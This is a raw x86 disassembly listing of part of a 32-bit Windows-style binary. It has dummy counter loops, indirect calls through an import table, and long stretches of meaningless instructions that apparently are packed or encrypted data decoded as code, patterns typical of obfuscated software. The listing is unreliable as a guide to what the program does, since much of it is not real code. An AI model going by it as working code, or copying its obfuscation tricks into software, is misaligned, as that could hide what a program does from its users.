  4061f7:	cmp    DWORD PTR ds:0x4122f4,0x0
  4061fe:	je     0x406239
  406204:	cmp    DWORD PTR ds:0x4122f4,0x14
  40620b:	jne    0x406227
  406211:	push   0x44a4
  406216:	push   DWORD PTR [ebp-0x20]
  406219:	push   0x788c
  40621e:	push   DWORD PTR [ebp-0x10]
  406221:	call   DWORD PTR ds:0x40d360
  406227:	mov    edi,DWORD PTR ds:0x4122f4
  40622d:	dec    edi
  40622e:	mov    DWORD PTR ds:0x4122f4,edi
  406234:	jmp    0x4061f7
  406239:	mov    edi,DWORD PTR [ebp-0x10]
  40623c:	or     DWORD PTR ds:0x4122ec,0x6f22
  406246:	sub    edi,edx
  406248:	adc    DWORD PTR ds:0x4233c3,edi
  40624e:	mov    edx,DWORD PTR [ebp-0x4]
  406251:	adc    DWORD PTR ds:0x41aa3a,0x7639
  40625b:	xor    edx,eax
  40625d:	sbb    DWORD PTR ds:0x4233d3,0x415035
  406267:	add    edx,ecx
  406269:	mov    DWORD PTR ds:0x41aa4a,0x19aa
  406273:	cmp    edi,edx
  406275:	mov    DWORD PTR ds:0x41502d,0x443e
  40627f:	jb     0x4072d5
  406285:	mov    edx,DWORD PTR [ebp-0x28]
  406288:	sbb    edi,0x1e1d
  40628e:	mov    edi,DWORD PTR [ebp-0x4]
  406291:	mov    ebx,DWORD PTR ds:0x417d15
  406297:	or     DWORD PTR ds:0x417d0d,ebx
  40629d:	xor    edx,eax
  40629f:	xor    edi,eax
  4062a1:	mov    DWORD PTR ds:0x417d25,0x5fc7
  4062ab:	add    edi,ecx
  4062ad:	dec    ebx
  4062ae:	add    edx,ecx
  4062b0:	dec    ebx
  4062b1:	imul   edx,edi
  4062b4:	sbb    DWORD PTR ds:0x41aa52,0x63fb
  4062be:	mov    edi,DWORD PTR [ebp-0x8]
  4062c1:	mov    DWORD PTR ds:0x41aa42,0x13
  4062cb:	cmp    DWORD PTR ds:0x41aa42,0x0
  4062d2:	je     0x406309
  4062d8:	cmp    DWORD PTR ds:0x41aa42,0x23
  4062df:	jne    0x4062f1
  4062e5:	push   DWORD PTR [ebp-0x18]
  4062e8:	push   DWORD PTR [ebp-0x24]
  4062eb:	call   DWORD PTR ds:0x40d364
  4062f1:	mov    ebx,DWORD PTR ds:0x41aa42
  4062f7:	dec    ebx
  4062f8:	mov    DWORD PTR ds:0x41aa42,ebx
  4062fe:	jmp    0x4062cb
  406303:	sbb    ebx,0x2ce7
  406309:	mov    ebx,DWORD PTR [ebp-0x10]
  40630c:	inc    DWORD PTR ds:0x41aa3e
  406312:	sub    ebx,edi
  406314:	mov    DWORD PTR ds:0x4233d7,0x7511
  40631e:	cmp    ebx,edx
  406320:	mov    DWORD PTR ds:0x41aa42,0x3d79
  40632a:	ja     0x40635a
  406330:	mov    edx,DWORD PTR [ebp-0x4]
  406333:	mov    DWORD PTR ds:0x4122f8,0x316e
  40633d:	xor    edx,eax
  40633f:	add    DWORD PTR ds:0x415039,0x4882
  406349:	add    edx,ecx
  40634b:	mov    DWORD PTR ds:0x417d29,0x234c
  406355:	jmp    0x40672b
  40635a:	mov    edx,DWORD PTR [ebp-0x2c]
  40635d:	sbb    DWORD PTR ds:0x412300,0x4f34
  406367:	mov    edi,DWORD PTR [ebp-0x4]
  40636a:	and    ebx,0x5352
  406370:	xor    edx,eax
  406372:	and    DWORD PTR ds:0x415041,0x0
  40637c:	jmp    0x40638e
  406381:	mov    ebx,DWORD PTR ds:0x415041
  406387:	inc    ebx
  406388:	mov    DWORD PTR ds:0x415041,ebx
  40638e:	cmp    DWORD PTR ds:0x415041,0x16
  406395:	jae    0x406508
  40639b:	cmp    DWORD PTR ds:0x415041,0x1c
  4063a2:	jne    0x4063b1
  4063a8:	push   DWORD PTR [ebp-0x1c]
  4063ab:	call   DWORD PTR ds:0x40d1d4
  4063b1:	jmp    0x406381
  4063b6:	jmp    0x406508
  4063bb:	add    eax,DWORD PTR [esi]
  4063bd:	mov    al,ds:0xf969b94b
  4063c2:	inc    esi
  4063c3:	popf   
  4063c4:	imul   ebp,DWORD PTR [ebx+0x1ed07818],0x76
  4063cb:	jmp    0x7e7f:0x237e7e0c
  4063d2:	jle    0x406356
  4063d4:	inc    ebx
  4063d5:	rcl    DWORD PTR [edx-0x17],1
  4063d8:	mov    DWORD PTR [eax+ebp*2+0x65],ecx
  4063dc:	shl    BYTE PTR [ebx],1
  4063de:	adc    dl,BYTE PTR [eax-0x4a3ceb4c]
  4063e4:	push   0xd8b2217
  4063e9:	jne    0x40641a
  4063eb:	outs   dx,DWORD PTR ds:[esi]
  4063ec:	pop    ecx
  4063ed:	jle    0x406405
  4063ef:	ja     0x4063b8
  4063f1:	pop    esi
  4063f2:	aam    0x2f
  4063f4:	xchg   esp,eax
  4063f5:	sbb    BYTE PTR [ecx],bh
  4063f7:	bound  ebx,QWORD PTR [edx+edx*8]
  4063fa:	cmp    BYTE PTR [edx],ch
  4063fc:	sub    BYTE PTR [ecx],ch
  4063fe:	jns    0x406456
  406400:	xor    DWORD PTR [esi-0x38],0xffffffba
  406404:	jmp    0xb313bc58
  406409:	cmp    DWORD PTR [edx+ecx*2],ebx
  40640c:	mov    edi,0x9a82a7f7
  406411:	(bad)  
  406412:	or     ebx,DWORD PTR [esi-0x12d42092]
  406418:	mov    esi,0x358d370e
  40641d:	mov    ds:0x16cd8e9c,al
  406422:	jno    0x406422
  406424:	mov    ?,WORD PTR [edx+0x180d429e]
  40642a:	out    0x50,eax
  40642c:	sbb    ch,al
  40642e:	retf   0x1f13
  406431:	jmp    0x3b13:0x19ee6c10
  406438:	js     0x406437
  40643a:	jne    0x406471
  40643c:	scas   al,BYTE PTR es:[edi]
  40643d:	push   es
  40643e:	adc    ecx,0x2a
  406441:	int3   
  406442:	add    BYTE PTR [eax-0x17113613],al
  406448:	iret   
  406449:	push   0xffffffc9
  40644b:	gs xchg edi,eax
  40644d:	ja     0x4064b5
  40644f:	push   edi
  406450:	repz ss dec ebx
  406453:	leave  
  406454:	pop    ds
  406455:	shr    cl,cl
  406457:	inc    eax
  406458:	retf   
  406459:	or     BYTE PTR [esi+0x44],al
  40645c:	call   FWORD PTR [eax+ecx*1+0x6fd5fa46]
  406463:	adc    ebp,esi
  406465:	jmp    FWORD PTR [ebx-0x4a]
  406468:	(bad)  
  406469:	mov    ds:0x93f67bfc,al
  40646e:	push   ds
  40646f:	mov    al,0x71
  406471:	icebp  
  406472:	daa    
  406473:	add    edx,DWORD PTR [ebp+ebp*8-0x37]
  406477:	cmp    eax,ebp
  406479:	hlt    
  40647a:	inc    esp
  40647b:	inc    esi
  40647c:	inc    ecx
  40647d:	(bad)  
  40647e:	inc    ecx
  40647f:	mov    DWORD PTR [ebx],esp
  406481:	dec    ebx
  406482:	inc    ebp
  406483:	leave  
  406484:	adc    eax,0x596aa3df
  406489:	fld    QWORD PTR [ecx+0xa]
  40648c:	pop    esi
  40648d:	ins    DWORD PTR es:[edi],dx
  40648e:	sub    al,0x37
  406490:	ficomp DWORD PTR [edx-0x63]
  406493:	addr16 jmp 0x4064ef
  406496:	rcr    DWORD PTR [esi-0x6fa568b0],cl
  40649c:	xor    ah,BYTE PTR [ebp+edx*4-0x48]
  4064a0:	sar    BYTE PTR [edx+0x61261c4f],1
  4064a6:	jecxz  0x40648c
  4064a8:	in     al,dx
  4064a9:	or     al,0x47
  4064ab:	ins    BYTE PTR es:[edi],dx
  4064ac:	pop    ss
  4064ad:	sub    al,0xe
  4064af:	pushf  
  4064b0:	add    eax,0xc3cf2ad
  4064b5:	mov    ?,WORD PTR [ebx-0x27ff1df4]
  4064bb:	xor    DWORD PTR [eax+0x197a13c2],esp
  4064c1:	aas    
  4064c2:	jns    0x40649d
  4064c4:	and    ebp,DWORD PTR [esp+ebx*2+0x70]
  4064c8:	mov    cl,BYTE PTR [ebx+0x56]
  4064cb:	sbb    bh,BYTE PTR [edx]
  4064cd:	aaa    
  4064ce:	mov    WORD PTR [edi],gs
  4064d0:	xchg   esi,eax
  4064d1:	fistp  QWORD PTR [edx-0x39]
  4064d4:	cdq    
  4064d5:	xor    eax,DWORD PTR [eax-0x34765df4]
  4064db:	(bad)  
  4064dc:	mov    ch,al
  4064de:	loope  0x40653f
  4064e0:	mov    bl,BYTE PTR [edi+ecx*8]
  4064e3:	lock jp 0x406516
  4064e6:	and    al,0x59
  4064e8:	out    dx,eax
  4064e9:	adc    eax,0x2807da6c
  4064ee:	adc    bh,BYTE PTR [eax-0x7b]
  4064f1:	je     0x406507
  4064f3:	jae    0x406566
  4064f5:	(bad)  
  4064f6:	stc    
  4064f7:	ficom  WORD PTR [edi]
  4064f9:	dec    esp
  4064fa:	(bad)  
  4064fb:	aas    
  4064fc:	sbb    eax,0x1ee3547b
  406501:	inc    ebp
  406502:	xlat   BYTE PTR ds:[ebx]
  406503:	mov    al,0x19
  406505:	dec    edi
  406506:	push   0x60
  406508:	xor    edi,eax
  40650a:	add    edi,ecx
  40650c:	add    edx,ecx
  40650e:	imul   edx,edi
  406511:	mov    edi,DWORD PTR [ebp-0x8]
  406514:	jmp    0x406666
  406519:	jbe    0x406527
  40651b:	xchg   ebp,eax
  40651c:	call   0xe08bdec6
  406521:	adc    DWORD PTR ds:0xdae74057,edi
  406527:	clc    
  406528:	inc    ebx
  406529:	lahf   
  40652a:	or     eax,0x7f237e7e
  40652f:	jle    0x4065af
  406531:	pop    es
  406532:	push   edx
  406533:	pop    es
  406534:	jae    0x406523
  406536:	in     eax,dx
  406537:	push   edi
  406538:	aam    0xf
  40653a:	rol    esp,0x52
  40653d:	or     dh,BYTE PTR [ebx]
  40653f:	sub    DWORD PTR [esi],esi
  406541:	popa   
  406542:	loopne 0x406511
  406544:	clc    
  406545:	popa   
  406546:	bound  eax,QWORD PTR [ebx+0x36254cea]
  40654c:	rcl    DWORD PTR [eax],0xae
  40654f:	inc    edi
  406550:	cli    
  406551:	adc    DWORD PTR [ecx],esi
  406553:	ja     0x406598
  406555:	repz mov ebp,?
  406558:	imul   edi,eax,0x147ef51f
  40655e:	cwde   
  40655f:	scas   al,BYTE PTR es:[edi]
  406560:	xchg   ebx,eax
  406561:	bound  esp,QWORD PTR [esi-0x22786494]
  406567:	retf   
  406568:	xlat   BYTE PTR ds:[ebx]
  406569:	repz or bh,ah
  40656c:	jbe    0x406549
  40656e:	(bad)  
  40656f:	std    
  406570:	pop    edi
  406571:	clc    
  406572:	stc    
  406573:	fadd   st(3),st
  406575:	or     DWORD PTR ds:0x308b8a73,esi
  40657b:	xchg   edi,eax
  40657c:	addr16 mov ah,0xcb
  40657f:	pop    ebp
  406580:	dec    ecx
  406581:	xor    al,0x47
  406583:	dec    esi
  406584:	push   0x4efd3e1f
  406589:	inc    ebp
  40658a:	test   BYTE PTR [ecx+ecx*2+0x12],cl
  40658e:	pop    ds
  40658f:	shl    DWORD PTR [edi+0x5b],0xce
  406593:	push   eax
  406594:	data16 sbb al,0x85
  406597:	cli    
  406598:	jmp    0xb8787413
  40659d:	shl    BYTE PTR [ebx+0x21bba8d1],1
  4065a3:	pop    es
  4065a4:	adc    bl,ch
  4065a6:	mov    dh,0x34
  4065a8:	out    dx,al
  4065a9:	(bad)
  4065ac:	iret   
  4065ad:	retf   
  4065ae:	jae    0x4065d3
  4065b0:	stos   DWORD PTR es:[edi],eax
  4065b1:	and    edx,0xffffff9b
  4065b4:	cdq    
  4065b5:	mov    ebx,0x34bc0f01
  4065ba:	fidiv  WORD PTR [ecx-0x56d3b898]
  4065c0:	fadd   st,st(7)
  4065c2:	xlat   BYTE PTR ds:[ebx]
  4065c3:	lahf   
  4065c4:	sbb    eax,esi
  4065c6:	fistp  DWORD PTR [edx+esi*8-0xf]
  4065ca:	shl    BYTE PTR [edx+0x2768c84],cl
  4065d0:	or     BYTE PTR [eax-0x7e05ffa5],cl
  4065d6:	scas   eax,DWORD PTR es:[edi]
  4065d7:	int    0x3c
  4065d9:	jge    0x4065c8
  4065db:	(bad)  
  4065dc:	xchg   edi,eax
  4065dd:	in     al,dx
  4065de:	xchg   esp,eax
  4065df:	sbb    al,0xba
  4065e1:	nop
  4065e2:	(bad)  
  4065e3:	stc    
  4065e4:	xor    esi,DWORD PTR [ebx+esi*1+0x4acb3135]
  4065eb:	inc    edx
  4065ec:	mov    esi,eax
  4065ee:	cli    
  4065ef:	icebp  
  4065f0:	adc    edi,DWORD PTR [esi-0x66]
  4065f3:	jle    0x4065fb
  4065f5:	daa    
  4065f6:	dec    eax
  4065f7:	adc    ebp,DWORD PTR [eax-0x1b]
  4065fa:	jb     0x40661f
  4065fc:	call   0x4d914d18
  406601:	mov    fs,ebp
  406603:	fsub   DWORD PTR [ebx+0x53]
  406606:	retf   
  406607:	daa    
  406608:	pop    esi
  406609:	test   al,0xb5
  40660b:	iret   
  40660c:	xor    eax,0xe4f22369
  406611:	mov    fs,WORD PTR [edi+0x5f08a429]
  406617:	inc    ecx
  406618:	mov    dl,0x2d
  40661a:	cmc    
  40661b:	xor    DWORD PTR [ebx-0x15591fe6],esp
  406621:	(bad)  
  406624:	fs fs push esi
  406627:	fld    DWORD PTR [eax+ebp*8-0x43]
  40662b:	xor    edi,DWORD PTR [edi+esi*4-0x6a]
  40662f:	jecxz  0x4065b4
  406631:	jne    0x4066a8
  406633:	shl    DWORD PTR ds:0x7d8b6b28,cl
  406639:	mov    ds:0x3e30cbb7,al
  40663e:	data16 jb 0x406695
  406641:	xor    eax,0xa482b3e9
  406646:	jnp    0x406634
  406648:	xchg   DWORD PTR [ebx],esp
  40664a:	dec    edi
  40664b:	inc    sp
  40664d:	cli    
  40664e:	xor    al,0x62
  406650:	xchg   ecx,eax
  406651:	stos   DWORD PTR es:[edi],eax
  406652:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406653:	pop    ebp
  406654:	shr    ecx,cl
  406656:	repz sub DWORD PTR [edi],0xffffffcb
  40665a:	pop    ss
  40665b:	out    dx,al
  40665c:	xchg   edi,eax
  40665d:	pop    esp
  40665e:	sti    
  40665f:	repz (bad) 
  406661:	ret    
  406662:	mov    bh,0xc8
  406664:	mov    WORD PTR [ebx],gs
  406666:	mov    ebx,DWORD PTR [ebp-0x10]
  406669:	sub    ebx,edi
  40666b:	cmp    ebx,edx
  40666d:	ja     0x40667b
  406673:	mov    edx,DWORD PTR [ebp-0x28]
  406676:	jmp    0x40671d
  40667b:	mov    edx,DWORD PTR [ebp-0x30]
  40667e:	mov    edi,DWORD PTR [ebp-0x4]
  406681:	xor    edx,eax
  406683:	xor    edi,eax
  406685:	add    edi,ecx
  406687:	add    edx,ecx
  406689:	imul   edx,edi
  40668c:	mov    edi,DWORD PTR [ebp-0x8]
  40668f:	mov    ebx,DWORD PTR [ebp-0x10]
  406692:	sub    ebx,edi
  406694:	cmp    ebx,edx
  406696:	ja     0x4066a4
  40669c:	mov    edx,DWORD PTR [ebp-0x2c]
  40669f:	jmp    0x40671d
  4066a4:	mov    edx,DWORD PTR [ebp-0x34]
  4066a7:	mov    edi,DWORD PTR [ebp-0x4]
  4066aa:	xor    edx,eax
  4066ac:	xor    edi,eax
  4066ae:	add    edi,ecx
  4066b0:	add    edx,ecx
  4066b2:	imul   edx,edi
  4066b5:	mov    edi,DWORD PTR [ebp-0x8]
  4066b8:	mov    ebx,DWORD PTR [ebp-0x10]
  4066bb:	sub    ebx,edi
  4066bd:	cmp    ebx,edx
  4066bf:	ja     0x4066cd
  4066c5:	mov    edx,DWORD PTR [ebp-0x30]
  4066c8:	jmp    0x40671d
  4066cd:	mov    edx,DWORD PTR [ebp-0x38]
  4066d0:	mov    edi,DWORD PTR [ebp-0x4]
  4066d3:	xor    edx,eax
  4066d5:	xor    edi,eax
  4066d7:	add    edi,ecx
  4066d9:	add    edx,ecx
  4066db:	imul   edx,edi
  4066de:	mov    edi,DWORD PTR [ebp-0x8]
  4066e1:	mov    ebx,DWORD PTR [ebp-0x10]
  4066e4:	sub    ebx,edi
  4066e6:	cmp    ebx,edx
  4066e8:	ja     0x4066f6
  4066ee:	mov    edx,DWORD PTR [ebp-0x34]
  4066f1:	jmp    0x40671d
  4066f6:	mov    edx,DWORD PTR [ebp-0x3c]
  4066f9:	mov    edi,DWORD PTR [ebp-0x4]
  4066fc:	xor    edx,eax
  4066fe:	xor    edi,eax
  406700:	add    edx,ecx
  406702:	add    edi,ecx
  406704:	imul   edx,edi
  406707:	mov    edi,DWORD PTR [ebp-0x8]
  40670a:	mov    ebx,DWORD PTR [ebp-0x10]
  40670d:	sub    ebx,edi
  40670f:	cmp    ebx,edx
  406711:	mov    edx,DWORD PTR [ebp-0x38]
  406714:	jbe    0x40671d
  40671a:	mov    edx,DWORD PTR [ebp-0x3c]
  40671d:	mov    edi,DWORD PTR [ebp-0x4]
  406720:	xor    edi,eax
  406722:	xor    edx,eax
  406724:	add    edi,ecx
  406726:	add    edx,ecx
  406728:	imul   edx,edi
  40672b:	mov    DWORD PTR [ebp+0xc],edx
  40672e:	mov    edx,DWORD PTR [ebp+0xc]
  406731:	mov    DWORD PTR [ebp-0x24],edx
  406734:	mov    edx,DWORD PTR [ebp-0x8]
  406737:	jmp    0x406889
  40673c:	lock cs xchg ebx,eax
  40673f:	xchg   esi,eax
  406740:	mov    eax,ds:0xd53889bb
  406745:	and    esp,DWORD PTR [ebp+0x1b]
  406748:	mov    edi,0x403248f9
  40674d:	add    bh,BYTE PTR [esi+0x7e]
  406750:	and    edi,DWORD PTR [edi+0x7e]
  406753:	jle    0x4066eb
  406755:	or     DWORD PTR [eax+0x50],eax
  406758:	mov    eax,es
  40675a:	les    edx,FWORD PTR [edx]
  40675c:	xor    ch,ah
  40675e:	ds sub eax,0x1e5d67c5
  406764:	fcmovnu st,st(2)
  406766:	(bad)  
  406768:	push   cs
  406769:	popa   
  40676a:	enter  0xf931,0x53
  40676e:	mov    ch,0x3d
  406770:	je     0x4067a4
  406772:	adc    eax,0xd375263b
  406777:	pop    es
  406778:	sbb    ebx,ecx
  40677a:	mov    ds:0x2196ab0d,eax
  40677f:	ja     0x406702
  406781:	(bad)  
  406782:	jp     0x406745
  406784:	les    eax,FWORD PTR [ecx-0x54419cb]
  40678a:	pop    ebx
  40678b:	into   
  40678c:	imul   BYTE PTR [esi+0x199ba5c1]
  406792:	fadd   QWORD PTR [edi-0x2]
  406795:	je     0x4067e1
  406797:	pop    ss
  406798:	(bad)  
  406799:	xor    ah,BYTE PTR [esi+0x7b]
  40679c:	push   ds
  40679d:	and    al,0x55
  40679f:	jmp    0x4067c2
  4067a1:	push   ebx
  4067a2:	jmp    0x29f7:0x867993d4
  4067a9:	push   esi
  4067aa:	aam    0xad
  4067ac:	ret    0x1c20
  4067af:	jge    0x4067fb
  4067b1:	mov    ah,0xb1
  4067b3:	pop    es
  4067b4:	outs   dx,DWORD PTR ds:[esi]
  4067b5:	and    BYTE PTR [ebp-0x7b1f6ea0],0xb8
  4067bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4067bd:	fld    st(0)
  4067bf:	pop    ebp
  4067c0:	repnz mov cl,0xfa
  4067c3:	mov    ebx,0xcf618088
  4067c8:	bound  edx,QWORD PTR ds:0xab63cbf5
  4067ce:	(bad)  
  4067cf:	lahf   
  4067d0:	test   eax,0x3af4287c
  4067d5:	lahf   
  4067d6:	dec    edx
  4067d7:	out    dx,eax
  4067d8:	adc    DWORD PTR [esi-0x64],edi
  4067db:	push   edi
  4067dc:	psubusw mm7,mm7
  4067df:	test   dl,0xad
  4067e2:	dec    edx
  4067e3:	js     0x4067e6
  4067e5:	xchg   esp,eax
  4067e6:	or     bl,bl
  4067e8:	sub    eax,0x5ba75677
  4067ed:	(bad)  
  4067ee:	loope  0x4067b0
  4067f0:	imul   eax,DWORD PTR [esi],0xf5c5f193
  4067f6:	inc    ebp
  4067f7:	jle    0x40682a
  4067f9:	jnp    0x4067d1
  4067fb:	fisttp QWORD PTR [esi-0x15]
  4067fe:	mov    eax,ds:0x8dcbdd58
  406803:	jnp    0x40685d
  406805:	sbb    DWORD PTR [ebx+0x4f014b54],0xffffffc6
  40680c:	jae    0x406832
  40680e:	mov    ch,dh
  406810:	sbb    eax,DWORD PTR [esi+0x54c644ed]
  406816:	push   ebx
  406817:	mov    al,BYTE PTR [ebx-0x5c]
  40681a:	leavew 
  40681c:	and    eax,0xef8043bb
  406821:	xor    BYTE PTR ds:0xde013ee,cl
  406827:	push   ebx
  406828:	popf   
  406829:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40682a:	xchg   bl,ch
  40682c:	popf   
  40682d:	xlat   BYTE PTR ds:[ebx]
  40682e:	lods   eax,DWORD PTR ds:[esi]
  40682f:	cmc    
  406830:	retf   
  406831:	jo     0x4067d1
  406833:	cld    
  406834:	sub    esp,ebx
  406836:	sahf   
  406837:	adc    BYTE PTR [esi+0x45b6ecea],dh
  40683d:	outs   dx,BYTE PTR ds:[esi]
  40683e:	mov    ah,0x7b
  406840:	cmp    ch,BYTE PTR ds:0xee6ac11f
  406846:	lds    edx,FWORD PTR ds:0x1c625a54
  40684c:	xchg   edx,eax
  40684d:	outs   dx,DWORD PTR ds:[esi]
  40684e:	data16 jmp 0x406897
  406851:	xchg   BYTE PTR [edx+0x53],ah
  406854:	(bad)  
  406855:	add    al,0x62
  406857:	retf   
  406858:	push   ecx
  406859:	push   cs
  40685a:	scas   eax,DWORD PTR es:[edi]
  40685b:	jbe    0x4067fe
  40685d:	imul   esi,edx,0x5d
  406860:	shr    BYTE PTR [edx],0xef
  406863:	dec    ecx
  406864:	inc    BYTE PTR [eax-0x3cdfe16c]
  40686a:	js     0x4068c0
  40686c:	mov    al,0x8f
  40686e:	dec    esp
  40686f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406870:	out    0x8e,al
  406872:	jecxz  0x406824
  406874:	dec    ebx
  406875:	or     edi,ebx
  406877:	and    ecx,DWORD PTR [edi+0x58]
  40687a:	pop    edx
  40687b:	leave  
  40687c:	hlt    
  40687d:	adc    BYTE PTR [ecx],cl
  40687f:	pusha  
  406880:	test   eax,0xd966d224
  406885:	aas    
  406886:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406887:	mov    esp,0xc0550371
  40688c:	mov    DWORD PTR [ebp-0x18],0xf89c8538
  406893:	mov    DWORD PTR [ebp-0x1c],edx
  406896:	mov    DWORD PTR [ebp-0xc],0xf89c853b
  40689d:	mov    DWORD PTR [ebp-0x44],0xf89c853a
  4068a4:	mov    edx,DWORD PTR [ebp-0x18]
  4068a7:	jmp    0x4069f9
  4068ac:	daa    
  4068ad:	mov    ecx,0x7980c50e
  4068b2:	in     eax,0x79
  4068b4:	dec    ebp
  4068b5:	push   esp
  4068b6:	push   ecx
  4068b7:	cmp    al,0xf8
  4068b9:	push   0x7521b4
  4068be:	jle    0x40693e
  4068c0:	and    edi,DWORD PTR [edi+0x7e]
  4068c3:	jle    0x4068a4
  4068c5:	mov    ch,0x37
  4068c7:	(bad)  
  4068c8:	mulps  xmm5,XMMWORD PTR [esi+0x2a213c08]
  4068cf:	leave  
  4068d0:	jmp    0x9458:0x188e6a31
  4068d7:	cmp    ch,ch
  4068d9:	add    BYTE PTR [edi+0x36],dh
  4068dc:	frstor [ebx]
  4068de:	adc    dh,ch
  4068e0:	shr    BYTE PTR [ebp-0x58],0x4c
  4068e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4068e5:	push   ebp
  4068e6:	cmc    
  4068e7:	sub    DWORD PTR [esi-0x7d740ad7],0x55
  4068ee:	stos   DWORD PTR es:[edi],eax
  4068ef:	mov    bl,0x60
  4068f1:	jo     0x4068c0
  4068f3:	sub    al,0xb9
  4068f5:	sbb    edi,DWORD PTR [ebx+ebp*1]
  4068f8:	leave  
  4068f9:	test   DWORD PTR gs:[edi],0xef24bcf0
  406900:	jecxz  0x4068fd
  406902:	or     al,0xca
  406904:	mov    dl,0x1
  406906:	add    DWORD PTR [ebp+edx*1-0x44],edi
  40690a:	jae    0x4068f9
  40690c:	sbb    cl,dh
  40690e:	xor    DWORD PTR [ebp-0x3a08fd30],ecx
  406914:	mov    esp,0x33857e5d
  406919:	pop    ss
  40691a:	ror    BYTE PTR [edx-0x10],1
  40691d:	pop    edx
  40691e:	call   0x929b2c60
  406923:	add    al,0xb3
  406925:	(bad)  
  406926:	adc    eax,0xe3c7ecad
  40692b:	lods   al,BYTE PTR ds:[esi]
  40692c:	jmp    0x431a7e3
  406931:	(bad)  
  406932:	out    dx,eax
  406933:	pop    edi
  406934:	lea    esp,[ecx+0x43be116d]
  40693a:	cli    
  40693b:	data16 mov cl,0xd3
  40693e:	shl    edi,cl
  406940:	dec    eax
  406941:	push   edx
  406942:	mov    bl,0x5a
  406944:	sbb    ebp,ebp
  406946:	call   0xfa34b5a
  40694b:	and    ecx,DWORD PTR [eax-0x682959e7]
  406951:	enter  0xb732,0x1
  406955:	test   eax,0x61fe93ad
  40695a:	into   
  40695b:	aaa    
  40695c:	jmp    0x4068e6
  40695e:	pop    ebp
  40695f:	lods   eax,DWORD PTR ds:[esi]
  406960:	mov    bl,0xe
  406962:	or     edi,esi
  406964:	stc    
  406965:	mov    esi,DWORD PTR [ebp+0x54]
  406968:	sub    ebx,ebp
  40696a:	fimul  WORD PTR [edx-0x18]
  40696d:	sbb    al,0x5a
  40696f:	mov    bl,0x56
  406971:	xchg   esp,eax
  406972:	dec    edx
  406973:	or     al,0xe3
  406975:	inc    ebx
  406976:	sbb    ah,BYTE PTR [ebp+0x6b1f1f40]
  40697c:	div    BYTE PTR [ebx+0x2c]
  40697f:	xor    DWORD PTR [eax],ecx
  406981:	mov    ecx,eax
  406983:	fdiv   st,st(7)
  406985:	stc    
  406986:	dec    eax
  406987:	jmp    0x40698c
  406989:	loop   0x406943
  40698b:	inc    cx
  40698d:	fisttp WORD PTR [edx+eiz*2]
  406990:	pop    ebp
  406991:	(bad)  
  406992:	jns    0x40698e
  406994:	loop   0x4069a4
  406996:	nop
  406997:	xor    al,0x2f
  406999:	and    al,0x4c
  40699b:	data16 in al,dx
  40699d:	add    ebp,ecx
  40699f:	mov    eax,ds:0xd7cdacb0
  4069a4:	mov    cl,0xd1
  4069a6:	and    bh,dl
  4069a8:	repz aam 0x7d
  4069ab:	push   esp
  4069ac:	push   esp
  4069ad:	xor    al,dh
  4069af:	ror    BYTE PTR [edx-0x14],1
  4069b2:	and    eax,0xe652f98d
  4069b7:	push   ebp
  4069b8:	(bad)  [eax+0x3a]
  4069bb:	cli    
  4069bc:	xor    bh,BYTE PTR [ecx+0x20af65dd]
  4069c2:	stos   DWORD PTR es:[edi],eax
  4069c3:	into   
  4069c4:	mov    dh,BYTE PTR [edi+0x67701741]
  4069ca:	shr    BYTE PTR [esi+0x5c51a2e0],1
  4069d0:	daa    
  4069d1:	in     al,0xfa
  4069d3:	pop    ecx
  4069d4:	stc    
  4069d5:	mov    dh,0x9a
  4069d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4069d8:	xchg   DWORD PTR [edx],esi
  4069da:	aas    
  4069db:	ja     0x4069d9
  4069dd:	jmp    0x9f8:0xbfac2556
  4069e4:	(bad)  
  4069e5:	outs   dx,BYTE PTR ds:[esi]
  4069e6:	sbb    DWORD PTR [edi+0x17db626b],esp
  4069ec:	or     al,0x0
  4069ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4069ef:	jp     0x40697b
  4069f1:	(bad)  
  4069f2:	iret   
  4069f3:	lods   al,BYTE PTR ds:[esi]
  4069f4:	or     bh,al
  4069f6:	cmp    ecx,DWORD PTR [ecx+0x9]
  4069f9:	xor    edx,eax
  4069fb:	jmp    0x406b4d
  406a00:	int    0xfb
  406a02:	mov    ebx,0x65b3b933
  406a07:	stc    
  406a08:	repnz add eax,0xf1e17a93
  406a0e:	lods   al,BYTE PTR ds:[esi]
  406a0f:	xchg   edi,eax
  406a10:	add    DWORD PTR ds:[esi+0x7e],edi
  406a14:	and    edi,DWORD PTR [edi+0x7e]
  406a17:	jle    0x406a21
  406a19:	xor    bh,BYTE PTR [edx-0x31d63988]
  406a1f:	sub    BYTE PTR ds:0xf45e0216,cl
  406a25:	loopne 0x406a39
  406a27:	outs   dx,BYTE PTR ds:[esi]
  406a28:	outs   dx,DWORD PTR es:[esi]
  406a2a:	jge    0x406a69
  406a2c:	xchg   ebp,eax
  406a2d:	arpl   WORD PTR [ebp+0x23],bp
  406a30:	retf   0x9a7f
  406a33:	mov    dh,0x2b
  406a35:	ret    0xf5cf
  406a38:	jg     0x406a54
  406a3a:	mov    ah,0x3b
  406a3c:	stos   BYTE PTR es:[edi],al
  406a3d:	push   eax
  406a3e:	push   es
  406a3f:	push   edi
  406a40:	jbe    0x406abf
  406a42:	mov    esi,0x4c4de0a
  406a47:	dec    eax
  406a48:	mov    esp,0xa21642d1
  406a4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a4e:	and    BYTE PTR [edi-0x59],dh
  406a51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406a52:	xlat   BYTE PTR ds:[ebx]
  406a53:	sti    
  406a54:	iret   
  406a55:	lods   al,BYTE PTR ds:[esi]
  406a56:	or     al,0x34
  406a58:	ins    BYTE PTR es:[edi],dx
  406a59:	imul   ebp,eax,0xa5c7e6b
  406a5f:	xchg   BYTE PTR [ebp-0x79],dh
  406a62:	addr16 jb 0x406a38
  406a65:	sbb    ecx,DWORD PTR [esi]
  406a67:	xor    edi,DWORD PTR [ebp+0x5121c13b]
  406a6d:	xor    eax,0xb38d8811
  406a72:	fxam   
  406a74:	adc    eax,0x27f4ad92
  406a79:	jmp    0x25de:0xf280bbba
  406a80:	or     eax,0xaa652a3c
